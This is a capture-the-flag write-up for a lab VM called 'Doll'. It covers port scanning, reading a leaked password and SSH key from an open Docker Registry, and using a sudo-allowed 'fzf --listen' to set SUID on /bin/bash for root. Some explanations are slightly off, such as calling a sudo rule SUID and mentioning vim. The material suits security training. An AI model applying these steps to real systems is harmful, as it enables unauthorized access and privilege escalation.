@@ -1,1 +1,330 @@
+ENUMERATION
+			
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.62 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 17:20 +03
+Nmap scan report for 10.0.2.62
+Host is up (0.00095s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 d7:32:ac:40:4b:a8:41:66:d3:d8:11:49:6c:ed:ed:4b (RSA)
+|   256 81:0e:67:f8:c3:d2:50:1e:4d:09:2a:58:11:c8:d4:95 (ECDSA)
+|_  256 0d:c3:7c:54:0b:9d:31:32:f2:d9:09:d3:ed:ed:93:cd (ED25519)
+1007/tcp open  http    Docker Registry (API: 2.0)
+|_http-title: Site doesn't have a title.
+MAC Address: 08:00:27:68:90:3A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.95 ms 10.0.2.62
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.26 seconds
+                        
+
+
+
+---I see open ssh and http ports, I go and check the page 10.0.2.62:1007 but its empty, so I run
+a gobuster scan---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.62:1007 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,jpg
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.62:1007
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,jpg,html,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/v2                   (Status: 301) [Size: 39] [--> /v2/]
+/http%3A%2F%2Fwww.html (Status: 301) [Size: 0] [--> /http:/www.html]
+/http%3A%2F%2Fwww.jpg (Status: 301) [Size: 0] [--> /http:/www.jpg]
+/http%3A%2F%2Fwww.txt (Status: 301) [Size: 0] [--> /http:/www.txt]
+/http%3A%2F%2Fwww.php (Status: 301) [Size: 0] [--> /http:/www.php]
+/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
+/http%3A%2F%2Fyoutube.jpg (Status: 301) [Size: 0] [--> /http:/youtube.jpg]
+/http%3A%2F%2Fyoutube.txt (Status: 301) [Size: 0] [--> /http:/youtube.txt]
+/http%3A%2F%2Fyoutube.php (Status: 301) [Size: 0] [--> /http:/youtube.php]
+
+
+
+---I see weird links, and find a /v2 page, I visit it---
+
+
+---I see headers JSON, Raw Data, Headers. I don't know what I am looking at here, I to search for this 
+online---
+
+
+---On the nmap scan it said the version is Docker Registry, I find a headline in hacktricks.com---
+
+https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry
+
+
+
+---Here it reads that this service is a HTTP based service and nmap can't detect it. This might be the
+first vulnerability that I saw nmap couldn't detect---
+
+
+---To discover it we can access /v2/ and we will see {} is returned or we access / and nothing happens,
+both of these scenarios are correct in our case---
+
+
+--------------------------------------------------------
+
+If you access / nothing is returned in the response
+
+If you access /v2/ then {} is returned
+
+If you access /v2/_catalog you may obtain:
+
+    {"repositories":["alpine","ubuntu"]}
+
+
+--------------------------------------------------------
+
+
+---I got this info from the website, lets do it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl -s http://10.0.2.62:1007/v2/
+{}                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# curl -s http://10.0.2.62:1007/   
+                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# curl -s http://10.0.2.62:1007/v2/_catalog
+{"repositories":["dolly"]}
+                             
+
+
+
+---looks like the username is dolly, let's try to find the password---
+
+
+---Now that we learned the repository, we can look at it's content, to do so we will use curl again---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl  http://10.0.2.62:1007/v2/dolly/manifests/latest
+
+
+
+---In the source code we get we find an sha26 hash and a password---
+
+
+
+sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
+
+passwd=devilcollectsit
+
+
+
+---Following this we will download another file within the dolly repository---
+
+                                                                                
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/35- DOLL LINUX CTF]
+└─# curl http://10.0.2.62:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 --output bruh.tar 
+  
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3707  100  3707    0     0   175k      0 --:--:-- --:--:-- --:--:--  181k
+      
+                                                                                                            
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/35- DOLL LINUX CTF]
+└─# ls
+bruh.tar  doll_linux_os_ctf_writeup.txt
+
+                
+
+---let's unzip this tar file---
+
+                                                                                                  
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/35- DOLL LINUX CTF]
+└─# tar -xf bruh.tar                   
+                                                                                                                  
+                                                     
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/35- DOLL LINUX CTF]
+└─# ls    
+bruh.tar  doll_linux_os_ctf_writeup.txt  etc  home  root
+                                                                       
+
+
+---we get multiple files when we unzip this tar, we explore them and find something interesting in 
+/home/bella/.ssh---
+
+
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/35- DOLL LINUX CTF]
+└─# cd home                 
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/35- DOLL LINUX CTF/home]
+└─# ls
+bela
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/35- DOLL LINUX CTF/home]
+└─# cd bela
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/HACKMYVM/35- DOLL LINUX CTF/home/bela]
+└─# ls
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/HACKMYVM/35- DOLL LINUX CTF/home/bela]
+└─# ls -la
+total 16
+drwxr-sr-x 3 okina okina 4096 Apr 25  2023 .
+drwxr-xr-x 3 root  root  4096 Apr 25  2023 ..
+-rw------- 1 okina okina   57 Apr 25  2023 .ash_history
+drwxr-sr-x 2 okina okina 4096 Apr 25  2023 .ssh
+-rwxr-xr-x 1 okina okina    0 Jan  1  1970 .wh..wh..opq
+
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/HACKMYVM/35- DOLL LINUX CTF/home/bela]
+└─# cd .ssh 
+
+                                                                                              
+┌──(root㉿kali)-[/home/…/35- DOLL LINUX CTF/home/bela/.ssh]
+└─# ls -la
+total 12
+drwxr-sr-x 2 okina okina 4096 Apr 25  2023 .
+drwxr-sr-x 3 okina okina 4096 Apr 25  2023 ..
+-rw-r--r-- 1 okina okina 2635 Apr 25  2023 id_rsa
+                        
+                                                                                          
+┌──(root㉿kali)-[/home/…/35- DOLL LINUX CTF/home/bela/.ssh]
+└─# cat id_rsa     
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDcKqC+Vu
+8+IuIYoOg+DY+jAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQCyBSUdK8GS
+.
+.
+.
+.
+.
+.
+.
+.
+IwfAXMerfQszIQO8ijGGZpnvAEGoLkTe5Rt7T0xpaxynK7I3h2YrwAzJOw/HdHwKUVRMsG
+gMYkFpPoaRxcBrGDNbkh5S55fFI397DXZMd3jAlviy57VjKQE3PvHnLfjZsewgm/wd8lxB
+/Ent8Jv8m+2ERVe/xEN7teIbqkDZ/RIrHw4bQHBnG6sB3obCEG+tN/3kbzJ6GFdzfiP62k
+s36mc0/mgAn/DqV6IUu+puFI3cRm8D1234DKkmWetOhGyu5TCnCUH83VYCwaKXpYddPXL0
+VtVwCw==
+-----END OPENSSH PRIVATE KEY-----
+                                    
+
+---we found the ssh key of the user bella most likely, let's get into ssh, if we are
+asked for the password we know it also---
+
+
+bela : devilcollectsit
+
+
+
+			GAINING FOOTHOLD
+			
+                                                                                                                  
+┌──(root㉿kali)-[/home/…/35- DOLL LINUX CTF/home/bela/.ssh]
+└─# ssh -i id_rsa bela@10.0.2.62 
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+bela@doll:~$ ls
+user.txt
+bela@doll:~$ cat user.txt 
+---First User Flag---
+
+
+---here we are in and got our first flag, let's explore more---
+			
+			
+bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+
+
+
+
+---here we discover a SUID permission, and in order to do it we need to use the 1337 port so I exit
+ssh service and log back in using the port, then we will run the SUID command---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/…/35- DOLL LINUX CTF/home/bela/.ssh]
+└─# ssh -i id_rsa bela@10.0.2.62 -L 1337:127.0.0.1:1337
+
+Last login: Mon May 20 18:26:47 2024 from 10.0.2.54
+bela@doll:~$ sudo /usr/bin/fzf --listen\=1337
+
+
+
+---you enter vim now open up anoter tab and curl th url we used above including a data---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://127.0.0.1:1337 -d 'execute(chmod u+s /bin/bash)' 
+
+
+
+---come back to ssh service, use ":qw" to exit vim---
+
+
+      
+
+			PRIVILEGE ESCALATION
+
+
+bela@doll:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
+
+
+---now we see that /bin/bash became executable---
+
+
+bela@doll:~$ bash -p
+
+bash-5.1# whoami
+root
+bash-5.1# cd /root
+bash-5.1# ls
+root.txt
+bash-5.1# cat root.txt
+---Root User Flag---
+
+
+
+
+
 
